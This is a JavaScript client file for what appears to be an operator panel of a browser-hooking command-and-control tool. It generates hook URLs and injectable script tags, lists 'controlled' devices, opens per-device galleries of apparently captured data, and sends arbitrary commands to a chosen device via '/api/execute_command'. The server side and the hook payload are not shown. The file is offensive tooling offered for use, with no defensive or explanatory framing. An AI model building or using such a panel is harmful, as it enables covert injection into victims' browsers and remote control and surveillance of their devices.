let currentDeviceId = '';

function generateHook() {
    fetch('/generate_hook')
        .then(response => response.json())
        .then(data => {
            const resultsDiv = document.getElementById('hookResults');
            resultsDiv.innerHTML = `
                <h3>Generated Hook Links:</h3>
                <p><strong>Demo URL:</strong> <a href="${data.demo_url}" target="_blank">${data.demo_url}</a></p>
                <p><strong>Hook URL:</strong> ${data.hook_url}</p>
                <p><strong>Script Tag:</strong></p>
                <textarea style="width: 100%; height: 60px; margin: 10px 0;">${data.script_tag}</textarea>
                <p><strong>Admin Panel:</strong> <a href="${data.admin_panel}" target="_blank">${data.admin_panel}</a></p>
            `;
        })
        .catch(error => {
            console.error('Error generating hook:', error);
        });
}

function controlDevice(deviceId) {
    currentDeviceId = deviceId;
    document.getElementById('modalDeviceId').textContent = deviceId;
    document.getElementById('controlModal').style.display = 'block';
}

function viewGallery(deviceId) {
    window.location.href = `/device_gallery/${deviceId}`;
}

function sendCommand(command) {
    if (!currentDeviceId) return;
    
    fetch('/api/execute_command', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            device_id: currentDeviceId,
            command: command
        })
    })
    .then(response => response.json())
    .then(data => {
        const resultsDiv = document.getElementById('commandResults');
        resultsDiv.innerHTML = `<p style="color: green;">Command sent successfully: ${command}</p>`;
        
        // Refresh device data after a delay
        setTimeout(() => {
            fetchDeviceData();
        }, 3000);
    });
}

function fetchDeviceData() {
    if (!currentDeviceId) return;
    
    fetch(`/api/device_data/${currentDeviceId}`)
        .then(response => response.json())
        .then(data => {
            console.log('Device data:', data);
        });
}

// Close modal when clicking X
document.querySelector('.close').addEventListener('click', function() {
    document.getElementById('controlModal').style.display = 'none';
});

// Close modal when clicking outside
window.addEventListener('click', function(event) {
    const modal = document.getElementById('controlModal');
    if (event.target === modal) {
        modal.style.display = 'none';
    }
});
